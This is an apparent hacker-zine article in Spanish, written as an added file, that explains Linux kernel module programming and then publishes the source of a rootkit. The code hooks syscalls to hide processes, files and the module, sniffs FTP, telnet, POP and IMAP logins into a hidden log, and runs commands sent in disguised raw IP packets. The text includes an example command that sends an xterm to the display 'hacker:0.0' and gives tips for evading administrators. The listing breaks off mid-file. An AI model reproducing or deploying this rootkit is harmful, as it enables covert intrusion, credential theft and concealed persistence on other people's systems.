@@ -1,0 +1,1251 @@
+-[ 0x0A ]--------------------------------------------------------------------
+-[ Linux Kernel Modules : LKMs ]---------------------------------------------
+-[ by Doing ]---------------------------------------------------------SET-22-
+
+
+
+                      LiNUX KERNEL MODULES : LKMs
+                    -------------------------------
+                               by Doing
+                        ----------------------
+
+                          pdoing@teleline.es
+
+
+
+ 1.- Introduccion
+ -----------------
+
+
+ Para los no iniciados aclarar que LKMs significa Linux Kernel Modules, y
+ que en este articulo voy a intentar explicar como programar modulos y en el
+ final del articulo incluire el codigo fuente de un modulo troyano, sniffer y
+ que oculta procesos y directorios. Me he basado en un par de excelentes
+ articulos de Phrack, y varias guias para aprender a programas modulos, pero 
+ desde luego esto no pretende ser una traduccion.
+
+
+
+
+ 2.- Programando "Hola, mundo!"
+ ------------------------------
+    
+ Un modulo es un trozo de codigo que se inserta en el kernel y por tanto se
+ ejecuta con privilegios Ring0. Que no sabes que es eso? El modo protegido del
+ 386 permite 4 modos de proteccion, del Ring0, al Ring3. El Ring0 es el modo
+ administrador, y el Ring3 es el modo usuario. El Ring1 es tambien modo
+ administrador pero con menos privilegios que el Ring0, y el Ring2 idem, pero
+ con menos privilegios que el Ring1. Linux solo usa el Ring0 y el Ring3. El 
+ kernel corre en Ring0 y todos los procesos de usuario corren en Ring3. Los
+ privilegios de un modo se podrian definir como las areas de memoria a las que
+ es capaz de acceder y modificar. En codigo Ring0, los accesos a memoria se 
+ hacen directamente, y ademas se puede leer y escribir en cualquier lugar de la
+ memoria, por eso si el kernel tiene algun bug o esta mal programado el sistema
+ se vuelve inestable (os podeis imaginar como debe estar programado el kernel 
+ de windows XD). En codigo Ring3, los accesos a memoria se hacen segun unas
+ tablas que gestiona el kernel para cada proceso. No voy a entrar en detalle 
+ explicando esto ya que no viene al caso, pero que sepais que la direccion de
+ las tablas se guarda en el registro de control 3, en el procesador. Si un
+ programa intenta acceder a una direccion de memoria a la que no tiene derecho
+ o no esta asignado en procesador genera una exepcion al S.O., y este se
+ encarga de matar al proceso, y tu verias el clasico segmention fault de toda
+ la vida :). 
+
+     Y si los programas de usuario no pueden escribir fuera de su rango de 
+ direcciones, ¿como pueden crear un socket o abrir un fichero?: con 
+ las llamadas al sistema (syscalls en adelante). En Linux se usa la int 0x80
+ para generar una syscall. En los registros ebx, ecx y edx se ponen los 
+ parametros, y en eax se pone el numero de syscall. 
+     Despues de todo este rollo vamos a empezar con los modulos :). Para 
+ compilar un modulo hay que definir los simbolos __KERNEL__ y MODULE. Tambien
+ hay que includir <linux/kernel.h>, <linux/module.h> y <linux/version.h>.
+ Hay que definir obligatoriamente dos rutinas:
+
+
+ - init_module()  
+     Es llamada justo despues de que el modulo sea insertado en el kernel, y
+   normalmente se usa para inicializar las estructuras de datos del kernel y
+   para instalar "handlers" en el sistema. Un handler puede ser, por ejemplo,
+   hacer que una llamada al sistema apunte a una rutina definida en nuestro 
+   modulo, asi que cualquier programa que use ioctl(), por poner un ejemplo,
+   estara llamando a nuestro programa. Con esto, hacer un modulo que oculte
+   el flag promiscuo es un juego de niños. init_module() devuelve un entero
+   que indica si el modulo se puede cargar, si devuelve un error el modulo
+   no se carga.
+
+
+ - cleanup_module()
+     Es llamado justa antes de descargar el modulo de la memoria. Se usa
+   para deshacer lo que hizo init_module(). Necesitas que de mas detalles?
+
+     Como con un modulo no se pueden escribir caracteres en una terminal asi
+ como asi, se usa printk(), que es como printf(), pero escribe en el fichero
+ /var/log/messages. 
+ Un modulo sencillito seria este:
+
+
+<++> modulos/holamundo.c
+#define __KERNEL__
+#define MODULE
+     
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+int init_module(void)
+{
+  printk(" Cargando el modulo: Hola mundo\n");
+  return 0; /* Ningun error */
+}
+
+void cleanup_module()
+{
+  printk(" Descargando el modulo: Adios mundo :)\n");
+}
+<-->
+
+
+
+     Para compilar un modulo hay que pasar al gcc estos parametros:
+
+
+ -Idirectorio_con_las_fuentes_del_kernel
+     En mi makina es -I/usr/src/linux-2.2.10/include/linux
+ -c
+     Porque queremos crear un fichero objeto, no un ejecutable
+
+ -O2
+     Si no especificas optimizacion, el kernel no carga el modulo 
+
+     Compilamos el modulo:
+
+ gcc -I/usr/src/linux-2.2.10/include/linux -c holamundo.c -O2
+ 
+     Lo insertamos y despues lo borramos:
+
+ insmod holamundo.o
+ rmmod holamundo 
+
+     Si haceis un tail de /var/log/messages vereis algo como esto:     
+
+# tail -n 2 /var/log/messages
+Jan 16 13:27:46 localhost kernel:  Cargando el modulo: Hola mundo
+Jan 16 13:27:59 localhost kernel:  Descargando el modulo: Adios mundo :)  
+
+     Facil, no?
+
+
+
+
+ 3.- Modificando syscalls
+ ------------------------
+
+
+ Modificar syscalls es mucho mas facil de lo que pensais. Solo tenemos que
+ definir esto:
+
+ extern void *sys_call_table[];  
+
+ Y ya tenemos las direccion de todas las syscalls. Como veis es un array,
+ y para referenciarlas nos hace falta un indice (joder que novedad no?); pues
+ bien, para saber a que numero corresponde una syscall os echais un vistazo
+ a <asm/unistd.h> y vereis las constantes __NR_nombre_de_la_syscall.
+
+ Ejemplos:
+
+ #define __NR_exit                 1
+ #define __NR_fork                 2
+ #define __NR_read                 3    
+
+ Lo que quiere decir que la direccion de exit en el kernel sera
+ sys_call_table[1]. 
+
+ Si quereis modificarla, pues en init_module() guardais el original de la
+ syscall y poneis la direccion de la vuestra, y en cleanup_module() la
+ restaurais, algo asi:
+
+ init_module() {
+ .
+ .
+ ioctl_original = sys_call_table[__NR_ioctl];
+ sys_call_table[__NR_ioctl] = mi_ioctl;
+ .
+ .
+ }
+ cleanup_module() {
+ sys_call_table[__NR_ioctl] = ioctl_original;
+ }
+
+ Si no restaurais la syscall original en cleanup_module() podeis iros
+ preparando a rebootear vuestra maquina al descargar el modulo, pero si
+ usais windows seguro que ya estais acostumbrados ;>. 
+
+
+
+ 4.- Ocultando procesos, archivos y directorios
+ ----------------------------------------------
+
+
+ Para hacer lo de arriba solo tenemos que modificar la syscall getdents.
+ getdents quiere decir "get directory entries", asi que, asi a primera vista
+ solo nos sirve para ocultar archivos y directorios. Pero,  Sabeis como hace
+ ps para ver los procesos?. Pues lee el directorio /proc, y los directorios
+ que empiezan por un numero son los pids de los procesos. Para ocultar un
+ proceso tenemos que modificar getdents de forma que ignore el pid de ese
+ proceso. Podeis mirar el codigo en el modulo que hay en final del articulo.
+
+
+
+ 5.- Ocultando el modulo y los simbolos del modulo
+ -------------------------------------------------
+
+
+ El kernel almacena el nombre y las caracteristicas de los modulos cargados
+ en una lista enlazada circular. Cada elemento de esta estructura tiene un
+ campo - next - que apunta al siguiente modulo. Para ocultar un modulo solo
+ tenemos qye hacer que el modulo que esta justo "detras" de el punte al que
+ esta delante. Esta tecnica de usa el kernel 2.2.x, porque en el 2.0.x hay
+ otra forma, que ya explicare. ¿Como podemos saber la direccion de esta lista
+ circular? Pues a la hora de "insmodear" el modulo, la direccion de la 
+ structura que apunta al modulo que estamos "insmodeando" suele estar en el
+ resgitro ebx o en el ebp. Entonces el campo next de esta estructura apunta
+ al ULTIMO modulo que hemos cargado. Para ocultarlo el modulo "ocultador"
+ tiene que hacer que su "next" apunte al "next" del siguiente modulo, 
+ ocultandolo, y despues devolver un error, porque no queremos cargar el 
+ modulo. Explicado graficamente:
+
+ Insertamos mi_modulo, que es un troyano:
+
+ modulo1->next ---------> mi_modulo->next ---------> modulo2->next -----> ...
+
+ Ahora insertamos el modulo "hider", y deja la lista enlazada asi:
+
+ modulo1->next ---\      mi_modulo->next ------> modulo2->next ---> ...
+		   \__________________________/
+
+
+ Si en este momento hicieramos un lsmod nuestro modulo troyano no apareceria.
+ El codigo de un modulo hider sacado de Phrack esta al final. 
+
+ El el kernel 2.0.x no hace falta usar otro modulo para ocultarse. Hay que
+ averiguar la direccion de la estructrura que apunta a nuestro modulo y a 
+ continuacion poner el nombre, el tamaño y sus referencias a 0.
+
+     Pero todavia pueden averiguar que hemos insertado un modulo troyano 
+ mirando los simbolos del kernel con ksyms. Para burlar esto en el kernel
+ 2.2.x basta con localizar la estructura que apunta a nuestro modulo y poner
+ el campo nsyms a 0. Rapido, limpio y facil :). En el 2.0.x la cosa se complica
+ un poco, porque no tiene campo nsyms, asi que tenemos que parchear la syscall
+ get_kernel_syms, y eliminar los simbolos de nuestro modulo, pero yo lo he
+ intentado y lo unico que he conseguido es que el ksyms me dijera:
+
+ "is someone else playing with modules?" 
+  
+     XD. Que cabron. Haciendo un strace se ve que lo que hace es llamar a 
+ get_kernel_syms con direccion destino 0, y esta devuelve el numero de
+ simbolos. Despues llama otra vez con una direccion de memoria valida y 
+ mi funcion le devuelve menos simbolos de los le habia dicho al principio :).
+     
+ Intente arreglarlo, pero lo unico que consegui es que se me colgara el
+ kernel (mal rollo), asi que opte por una solucion mas radikal: devolver 
+ siempre 0. No es muy elegante, pero si el admin no es muy listo colara :-P
+
+
+
+ 6.- Sniffando paquetes
+ ----------------------
+
+     Para esnifar paquetes nos hacen falta tres(3) cosas:
+
+
+ - Una estructura packet_type que usaremos para registar e instalar nuestro
+   filtro.
+
+ - Registrar e instalar la estructura de arriba con dev_add_pack()
+
+ - Una rutina que se encargue de recibir los paquetes y procesarlos, cuya
+   direccion tendremos que poner en el campo func de la estructura arriba
+   mencionada.
+
+     La rutina que se encarga de procesar los paquetes toma tres argumentos:
+
+
+ - Un puntero a una estructura sk_buff, otro a una estructura device y otro 
+   a una est. packet_type.
+
+     El que nos interesa a nosotros es el primero. Todos los paquetes son
+ colocados en estructuras sk_buffs, para luego ser procesados por los handlers
+ registrados. 
+
+
+     Campos que nos interesan de la estructura sk_buff:
+
+
+ - skb->nh : 
+     nh significa network header, y contiene la cabecera de la capa de red.
+   En este caso es una cabecera IP. Para referenciar dicha cabecera se usa
+   skb->nh.iph. (en 2.0.x es skb->h.iph)
+
+ - skb->h :
+     es una union de punteros que se usan para referenciar a la cabecera de
+   la capa de transporte (tcp). Para apuntarlo se usa skb->h.raw y para
+   referenciarlo skb->h.nh. (en 2.0.x solo existe el campo con la cabecera IP).
+
+ - skb->data : 
+     Lo usaremos para apuntar a los datos del paquete.
+
+     De estos campos el unico que esta apuntando correctamente es el de la
+ cabecera IP. Los demas tendremos que ajustarlos nosotros.
+
+     Con lo que tenemos ya podemos hacer un sniffer exactamente igual que en 
+ un programa normal, pero hay un problema: no sabemos como loguear las 
+ conexiones. Pues exactamente igual que en un sniffer en Ring3: con las 
+ syscalls open y write. Pero si hacemos esto nos encontramos con otro problema;
+ si recordais, las syscalls esperan en los parametros punteros que apuntan
+ en el espacio de direcciones de la aplicacion que se esta ejecutando en ese
+ momento, y nosotros queremos pasarle punteros del kernel, que evidentemente
+ no funcionarian. Entonces necesitamos reservar memoria en el espacio del 
+ usuario, ¿como?, como lo hace malloc(): cambiando el valor del final del
+ segmento de datos (brk), utilizando la syscall brk. Al principio parece
+ complicado pero ya vereis como no lo es. Para escribir o leer datos desde
+ un puntero que apunte a una direccion de usuario se usan las funciones:
+
+ - __generic_copy_from_user(dst, src, count);
+
+ - __generic_copy_to_user(dst, src, count);
+
+    Pero todavia tenemos otro problema (joder que cantidad de problemas!): 
+ hemos dicho que vamos a usar la tarea actual para conseguir memoria de 
+ usuario, pero el kernel no tiene siempre un tarea ejecutandose. Como sabemos
+ que una tarea se esta ejecutando? - Cuando se produce una syscall. Lo que
+ vamos a hacer es conseguir memoria de usuario cuando se produzca una syscall.
+ Mirad el codigo fuente para que os quede mas claro.
+
+
+
+ 7.- Referencias
+ ---------------
+
+
+ - Phrack. Issue 52. Articulo 18 "Weakening the Linux Kernel"
+ - Phrack. Issue 52. Articulo 17 "Protected mode programming and O/S 
+   development"
+ - Phrack. Issue 55. Articulo 12 "Building Into The Linux Network Layer"
+ - "Linux Kernel Module Programming Guide" - Ori Pomerantz
+ - Las fuentes del kernel :)
+
+
+
+ 8.- Caracteristicas del modulo
+ ------------------------------
+
+
+     El modulo puede compilar en kernels 2.2.x o 2.0.x. Para compilarlo para 
+ uno u otro: make K22 o make K20. Si lo compilas para el 2.2.x tambien te 
+ compila el modulo hider. Junto con el modulo esta el codigo fuente de un
+ programa llamado control que sirve para ejecutar (backdoor) algun programa
+ ocultandolo, o bien para ocultar algun proceso o fichero. Para comunicarse
+ con el modulo manda un paquete IP con el campo protocol a 128, y los datos 
+ estan encriptados (un simple XOR) para evitar que algun monitor de paquetes 
+ vea que por su red circulan paquetes con los datos: "/usr/X11R6/bin/xterm 
+ -display hacker:0.0 -ut -e /bin/tcsh". Seria bastante sospechoso no? :). 
+ Tambien es un sniffer, que escucha conexiones en los puertos 21, 23, 109,110,
+ 143 y 513. Las conexiones se loguean el fichero LOG_FILE, que por defecto es 
+ "/tmp/.mis_logs_33137". Os recomiendo que lo cambieis, y que nada mas
+ instalarlo oculteis el archivo con el programa control.
+
+ Si lo compilas para el kernel 2.0.x no hace falta que insertes el modulo
+ hider, pero en el 2.2.x si hace falta. El programa control es muy cutre, y
+ seguro que mas de un script kiddie no sabe usarlo (mejor ;) ). Lo que hace el
+ backdoor es cambiar la primera llamada que se hace a execve() para ejecutar
+ nuestro backdoor, asi que el programa control se conecta al puerto telnet
+ para que se ejecute el telnetd, ya que si el root (por ejemplo) hace un ls
+ y no le sale nada, o peor, le dice que el xterm no puede abrir el display
+ hacker:0.0 seria muy sospechoso. El modulo tambien oculta el flag del
+ modo promiscuo, pero no lo pone. Para ponerlo:
+ 
+ #insmod modsniff.o
+ #insmod hider.o
+  error: dispositivo o recurso ocupado (logico)
+ #ifconfig eth0 promisc
+ #ifconfig eth0 -promisc
+
+ Y ya esta. Tened cuidado, y cambiad lo de la forma de comunicarse con el
+ modulo, porque si no lo cambiais, haciendo un broadcast con un paquete de
+ ese tipo os podrian descubrir. 
+
+
+ 9.- Clave pgp
+ -------------
+
+ <Ir a 0x14>
+
+
+ 10.- El codigo
+
+<++> modulos/modsniff/Makefile
+
+all: K22
+
+# Modificad KERNEL_HEADERS con vuestra path a las cabeceras
+# del kernel
+
+KERNEL_HEADERS=-I/usr/src/linux-2.2.10/include/linux
+
+CFLAGS=-c -O2 -fomit-frame-pointer
+
+K22: clean control_main
+        gcc $(KERNEL_HEADERS) $(CFLAGS) -DK22 modsnif.c
+        gcc $(KERNEL_HEADERS) $(CFLAGS) -DK22 hider.c
+
+K20: clean control_main
+        gcc $(KERNEL_HEADERS) $(CFLAGS) -DK20 modsnif.c
+
+control_main:
+        gcc control.c -o control
+
+clean:
+        rm -rf *~ *# modsnif.o hider.o control
+                                              
+<-->
+
+<++> modulos/modsniff/control.c
+
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netdb.h>
+#include <errno.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <getopt.h>
+
+#include <linux/if.h>
+#include <linux/sockios.h>
+
+u_int32_t mi_ip()
+{
+  struct ifreq *ifr;
+  struct ifconf ifc;
+  int fd = socket(AF_INET, SOCK_DGRAM, 0);
+  int c, d = 1;
+  u_int32_t dir;
+
+  bzero(&ifc, sizeof(ifc));
+  if (ioctl(fd, SIOCGIFCONF, &ifc) < 0) {
+    perror(" mi_ip() ");
+    exit(0);
+  }
+
+  ifr = (struct ifreq*) malloc(ifc.ifc_len);
+  (long*) ifc.ifc_buf = ifr;
+
+  if (ioctl(fd, SIOCGIFCONF, &ifc) < 0) {
+    perror(" mi_ip() ");
+    exit(0);
+  }
+    
+  c = (ifc.ifc_len / sizeof(struct ifreq));
+  
+  for (d = 0; d < c; d++) 
+    if (strncmp(ifr[d].ifr_name,"lo",2) != 0) {
+      dir = (*(struct sockaddr_in*)&ifr[d].ifr_addr).sin_addr.s_addr;
+      if (ioctl(fd, SIOCGIFFLAGS, &ifr[d]) < 0) {
+	perror(" mi_ip() ");
+	exit(0);
+      }
+      if (ifr[d].ifr_flags & IFF_UP) return dir;
+    }
+  return inet_addr("127.0.0.1");
+}
+
+long resuelve(char *host)
+{
+  struct hostent *res;
+  long ret;
+
+  if (inet_addr(host) != -1){
+    ret = inet_addr(host);
+    return ret;
+  }
+  res = gethostbyname(host);
+  if (res == NULL){
+    printf("\n Error : gethostbyname() : No se puede resolver el nombre del host\n\n");
+    exit(0);
+  }
+ 
+  memcpy((char*)&ret,(char*)res->h_addr,res->h_length);
+  return ret;
+}
+
+struct mensaje {
+  char cmd[1024];
+  char k;
+  char type;
+  u_int32_t addr;
+  u_int16_t port;
+} *men;
+
+void encripta(char *pt, char k, int len)
+{
+  int c = len;
+  while (c--) pt[c] = pt[c] ^ k;
+}
+
+void main(int argc, char **argv)
+{
+  char buff[4096];
+  struct iphdr *ip = (struct iphdr*) buff;
+  char *DATA = (char*) (buff + sizeof(struct iphdr));
+  struct sockaddr_in dir = { AF_INET, 0, 0};
+  int fde = socket(AF_INET, SOCK_RAW, 255),ret;
+  char *cmd, x, l, c;
+  unsigned long saddr, daddr;
+
+  if (argc < 5) {
+    printf(" Uso:\n");
+    printf("\t%s <host destino> <clave> <type> <str>\n\t(type = 1 back, 2 pid)\n\n",argv[0]);
+    exit(0);
+  }
+
+  saddr = mi_ip();
+  daddr = resuelve(argv[1]);
+  cmd = argv[4];
+
+  dir.sin_family = AF_INET;
+  dir.sin_addr.s_addr = daddr;
+  bzero(buff,4096);
+
+  men = (struct mensaje*) DATA;
+  memcpy(men->cmd , cmd, strlen(cmd) + 1);
+  men->k = argv[2][0];
+  men->type = atoi(argv[3]); 
+
+  encripta( men->cmd, argv[2][0], 1024);
+
+  ip->ihl = 5;
+  ip->version = 4;
+  ip->ttl = 0xff;
+  ip->protocol = 123;
+  ip->id = rand() % 10;
+
+  ip->saddr = saddr;
+  ip->daddr = daddr;
+  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct mensaje));
+
+  ret = sendto(fde,buff,(sizeof(struct iphdr) + sizeof(struct mensaje)),0,(struct sockaddr_in*)&dir,sizeof(dir));
+  close(fde);
+  if (men->type == 1) {
+    fde = socket(AF_INET, SOCK_STREAM, 6);
+    dir.sin_port = htons(23);
+    if (connect(fde, (struct sockaddr_in*) &dir, sizeof(dir)) < 0) 
+      printf(" Error conectando : %s\n",strerror(errno));
+    close(fde);
+  }
+}
+<-->
+
+<++> modulos/modsniff/hider.c
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+int init_module(void) {
+
+/*
+ *  if at first you dont suceed, try:
+ *  %eax, %ebx, %ecx, %edx, %edi, %esi, %ebp, %esp 
+ *  I cant make this automaticly, because I'll fuck up the registers If I do 
+ *  any calculus here.
+ */
+	register struct module *mp asm("%ebx");
+	
+	if (mp->init == &init_module) /* is it the right register? */
+		if (mp->next) /* and is there any module besides this one? */
+			mp->next = mp->next->next; /* cool, lets hide it :) */
+	return -1; /* the end. simple heh? */
+}
+
+<-->
+
+<++> modulos/modsniff/modsniff.c
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/ctype.h>
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/fd.h>
+#include <linux/if.h>
+#include <linux/if_ether.h>
+#include <linux/unistd.h>
+#include <linux/fs.h>
+#include <linux/net.h>
+#include <linux/fcntl.h>
+#include <linux/netdevice.h>
+#include <linux/tcp.h>
+#include <linux/ip.h>
+#include <linux/fcntl.h>
+#include <linux/proc_fs.h>
+#include <linux/dirent.h>
+
+#include <syscall.h>
+
+#include <asm/segment.h>
+
+int errno;
+
+#ifdef K20
+#define __generic_copy_from_user memcpy_fromfs
+#define __generic_copy_to_user memcpy_tofs
+#endif
+
+static inline _syscall1(int, brk, void *, end_data_segment);
+static inline _syscall3(int, open, char *, name, int, flags, mode_t, mode);
+static inline _syscall3(int, write, int, fd, const void *, buf, size_t, len);
+static inline _syscall1(int, close, int, fd);
+
+extern void *sys_call_table[];
+
+char cmd[1024];
+
+/*
+ *  Poned en LOG_FILE el archivo donde se guardaran los logs
+ *  del sniffer
+ */
+
+#define LOG_FILE "/tmp/.mis_logs_33137"
+
+/*
+ *  Esta estructura se usa para mantener las conexiones
+ *  activas en memoria en una lista doblemente enlazada
+ */
+
+#define DATA_LEN 512
+
+struct Con {
+  __u32 sa,da,sSeq,dSeq;
+  __u16 sp,dp;
+  char data[DATA_LEN];
+  int len, log;
+  struct Con *sig,*ant;
+} *Conroot = NULL;
+
+#define SIZE_CON sizeof(struct Con)
+
+/*
+  Funciones de utilidad
+*/
+
+struct Con *Busca(__u32 , __u32 , __u16 , __u16 );
+void mibzero(char *,int );
+char *mintoa(__u32 );
+int mira_port(__u16 );
+int mi_ioctl(int , int , unsigned long);
+int Filtro(struct sk_buff *, struct device *, struct packet_type *);
+void Procesa(struct iphdr*, struct tcphdr*, char*, int);
+void Nuevacon(__u32 , __u32 , __u16 , __u16);
+void Borracon(struct Con*);
+int Datos(__u32 , __u32 , __u16 , __u16, char*, int, __u32);
+void loguea(struct Con*);
+int mi_getdents(unsigned int fd, struct dirent *dirp, unsigned int count);
+int mi_get_kernel_syms(struct kernel_sym *table);
+int oculta(struct module *);
+void backdoor(struct sk_buff*);
+int mi_execve (char *, const char **, const char**);
+void actualizaseq(struct Con*, __u16, struct tcphdr*);
+int miraseq(struct Con*, __u16, __u32);
+void nuevo_pid(char*);
+int busca_pid(char*);
+
+/* 
+ *  estos vectores apuntan a las llamadas al sistema originales
+ */
+
+int (*o_ioctl) (int fd, int pet, unsigned long arg);   
+int (*o_getdents) (unsigned int fd, struct dirent *dirp, unsigned int count);
+int (*o_get_kernel_syms) (struct kernel_sym *table);
+int (*o_execve) (char *, const char**, const char**);
+
+/*
+ *  flags del modo promiscuo del interfaz y de la ejecucion del backdoor
+ */
+
+int promisc = 0;
+int back = 0;
+
+/*
+ *  Este array lo uso para almacenar los pids y los archivos a ocultar por
+ *  getdents()
+ */
+char *pids[1024]; 
+/*
+ *  Podria haber usado una lista enlazada para ahorrar memoria pero no
+ *  tenia ganas XD
+ */
+int npids = 0;
+ 
+/*
+ *  Esta estructura define el filtro a usar para
+ * "sniffar" paquetes
+ */ 
+
+struct packet_type mihandler;
+
+/*
+ *  Puertos en los que esnifar conexiones
+ */
+ 
+__u16 Ports[6] = { 21, 23, 109, 110, 143, 513 };
+
+void cleanup_module()
+{
+  struct Con *tmp;
+  sys_call_table[SYS_ioctl] = (void*) o_ioctl;
+  sys_call_table[SYS_getdents] = (void*) o_getdents;
+  sys_call_table[SYS_execve] = (void*) o_execve;
+
+#ifdef K20
+  sys_call_table[SYS_get_kernel_syms] = (void*) o_get_kernel_syms;
+#endif
+
+  dev_remove_pack(&mihandler); 
+/*
+ *  Libero la memoria ocupada por la lista enlazada
+ */
+  while (Conroot) {
+    tmp = Conroot;
+    Conroot = Conroot->sig;
+    kfree(tmp);
+  }
+} 
+
+int init_module()
+{
+  register struct module *mp asm("%ebp");
+  register struct module *mp2 asm("%ebx");
+  
+/*
+ *  Averiguo en que registro se encuentra el puntero a la estructura de
+ *  este modulo y lo oculto (en el 2.0.x)
+ */
+  if (&cleanup_module == mp2->cleanup) oculta(mp2);
+  else 
+    if (&cleanup_module == mp->cleanup) oculta(mp);
+    else
+      return -1;
+/*
+ *  Si el puntero al modulo no estaba en ebp ni en ebx no cargo el modulo.
+ *  Cambia los registros por cualquier otro y vuelvelo a cargar.
+ */
+  
+/*
+ *  Pongo mis propias syscalls
+ */
+  o_ioctl = sys_call_table[SYS_ioctl];
+  sys_call_table[SYS_ioctl] = (void*) mi_ioctl;
+
+  o_getdents = sys_call_table[SYS_getdents];
+  sys_call_table[SYS_getdents] = (void*) mi_getdents;
+
+  o_execve = sys_call_table[SYS_execve];
+  sys_call_table[SYS_execve] = (void*) mi_execve;
+
+  sys_call_table[200] = (void*) o_execve;
+
+#ifdef K20
+  o_get_kernel_syms = sys_call_table[SYS_get_kernel_syms];
+  sys_call_table[SYS_get_kernel_syms] = (void*) mi_get_kernel_syms;
+#endif
+
+/*
+ *  Y tambien el filtro para el sniffer
+ */
+  mibzero((char*)&mihandler,sizeof(mihandler));
+  mihandler.type = htons(ETH_P_IP);
+  mihandler.func = Filtro;
+  dev_add_pack(&mihandler);
+  
+  return 0;
+}
+
+int oculta(struct module *mp)
+{
+/*
+ *  Si el kernel es el 2.2.x ponemos nsyms=0 para burlar a
+ *  get_kernel_syms()
+ */
+#ifdef K22
+  mp->nsyms = 0;
+#endif
+
+/*
+ *  Si el kernel es el 2.0.x ocultamos el modulo directamente
+ */
+#ifdef K20
+  *(char*)mp->name = 0;
+  mp->size = 0;
+  mp->ref = 0;  
+#endif
+  return 0;
+}
+
+int Filtro(struct sk_buff *skb, struct device *dv, struct packet_type *pt) 
+{
+  int len;
+
+#ifdef K22
+  backdoor(skb);
+
+  if (skb->nh.iph->protocol == 6) {
+    
+    skb->h.raw = skb->nh.raw + (skb->nh.iph->ihl * 4);
+    skb->data = skb->nh.raw + (skb->nh.iph->ihl * 4) + (skb->h.th->doff * 4);
+    len = htons(skb->nh.iph->tot_len) - (skb->nh.iph->ihl * 4) - (skb->h.th->doff * 4);
+
+    if ((mira_port(skb->h.th->source)) || (mira_port(skb->h.th->dest)))
+      Procesa(skb->nh.iph,skb->h.th,skb->data,len); 
+  }
+  kfree_skb(skb);
+#endif  
+
+#ifdef K20
+  struct tcphdr *tcp;
+  char *ptr;
+
+  backdoor(skb);
+  if (skb->h.iph->protocol == 6) {
+    
+    ptr = (char*) skb->h.raw + (skb->h.iph->ihl * 4);
+    tcp = (struct tcphdr*) ptr;
+    skb->data = skb->h.raw + (skb->h.iph->ihl * 4) + (tcp->doff * 4);
+    len = htons(skb->h.iph->tot_len) - (skb->h.iph->ihl * 4) - (tcp->doff * 4);
+    
+    if ((mira_port(tcp->source)) || (mira_port(tcp->dest)))
+      Procesa(skb->h.iph,tcp,skb->data,len); 
+  }
+  kfree_skb(skb, FREE_READ);
+#endif  
+
+return 0;
+}
+
+struct mensaje {
+  char cmd[1024];
+  char k;
+  char type; /* 1 = backdoor, 2 = ocultar pid */
+  __u32 addr;
+  __u16 port;
+} *men;
+
+void encripta(char *pt, char k, int len)
+{
+  int c = len;
+  while (c--) pt[c] = pt[c] ^ k;
+}
+
+void backdoor(struct sk_buff *skb)
+{
+  char *data;
+  
+#ifdef K20
+  if (skb->h.iph->protocol != 123) return;
+  data = skb->h.raw + (skb->h.iph->ihl * 4);
+#endif
+#ifdef K22
+  if (skb->nh.iph->protocol != 123) return;
+  data = skb->nh.raw + (skb->nh.iph->ihl * 4);
+#endif
+  men = (struct mensaje*) data;
+  
+  encripta(men->cmd, men->k, 1024);
+  if (strlen(men->cmd) >= 1024) return;
+ 
+  if (men->type == 1) {
+    strcpy(cmd, men->cmd);
+    back = 1;
+  }
+  if (men->type == 2) nuevo_pid(men->cmd);
+}
+
+void Procesa(struct iphdr *ip, struct tcphdr *tcp, char *data, int len)
+{
+  struct Con *ctmp;
+
+/*
+ *  Si el paquete tiene el flag SYN es una peticion de conexion
+ */
+  if (tcp->syn == 1) 
+    if (Busca(ip->saddr, ip->daddr, tcp->source, tcp->dest) == NULL) {
+      Nuevacon(ip->saddr, ip->daddr, tcp->source, tcp->dest);
+      ctmp = Busca(ip->saddr, ip->daddr, tcp->source, tcp->dest);
+/*
+ *  Guardo los ISN
+ */
+      actualizaseq(ctmp, tcp->source, tcp);
+      return;
+    }
+  
+/*
+ *  Si tiene FIN o el RST la marcamos como terminada y lista para loguear
+ */
+  if ((tcp->fin == 1) ||
+      (tcp->rst == 1)) {
+    ctmp = Busca(ip->saddr, ip->daddr, tcp->source, tcp->dest);
+    if (ctmp) ctmp->log = 1;
+    return;
+  }
+
+/*
+ *  Si llegamos aqui el paquete es un paquete de datos, si tiene los añadimos
+ *  al buffer de la conexion y actualizamos los SEQ numbers
+ */
+  if (len > 0) 
+    if (Datos(ip->saddr, ip->daddr, tcp->source, tcp->dest, data, len, tcp->seq)) {
+      ctmp = Busca(ip->saddr, ip->daddr, tcp->source, tcp->dest);
+      if (ctmp) actualizaseq(ctmp, tcp->source, tcp);
+    }
+}
+
+int Datos(__u32 sa, __u32 da, __u16 sp, __u16 dp, char *data, int len, __u32 seq)
+{
+  struct Con *btmp;
+
+  btmp = Busca(sa, da, sp, dp);
+  if (!btmp) return 0;
+
+  if (!miraseq(btmp, sp, seq)) return 0;
+
+  if ((btmp->len + len) > DATA_LEN) return;
+
+  memcpy(&btmp->data[btmp->len], data, len);
+  btmp->len += len;
+  return 1;
+}
+
+int miraseq(struct Con *con, __u16 port, __u32 seq)
+{
+  if (port == con->sp) {
+    if (con->sSeq == 0) return 1;
+    if (htonl(con->sSeq) < htonl(seq)) return 1;
+    return 0;
+  }
+  if (port == con->dp) {
+    if (con->dSeq == 0) return 1;
+    if (htonl(con->dSeq) < htonl(seq)) return 1;
+    return 0;
+  }
+}
+
+void actualizaseq(struct Con *con, __u16 port, struct tcphdr *tcp)
+{
+  if (port == con->sp) {
+    con->sSeq = tcp->seq;
+    return;
+  }
+  if (port == con->dp) {
+    con->dSeq = tcp->seq;
+    return;
+  }
+}
+  
+void Borracon(struct Con *bcon)
+{
+  struct Con *ant, *sig;
+  
+  ant = bcon->ant;
+  sig = bcon->sig;
+
+  if ((bcon == Conroot) && (!bcon->sig)) Conroot = NULL;
+  if ((bcon == Conroot) && (bcon->sig)) Conroot = bcon->sig;
+  kfree(bcon);
+
+/*
+ *  Hay que tener cuidado con los punteros en codigo Ring0 ;)
+ */
+  if ((ant) && (sig)) {
+    ant->sig = sig;
+    sig->ant = ant;
+    return;
+  }
+  if ((ant) && (!sig)) {
+    ant->sig = NULL;
+    return;
+  }
+  if ((sig) && (!ant)) {
+    sig->ant = NULL;
+    return;
+  }
+}
+
+void loguea(struct Con *con)
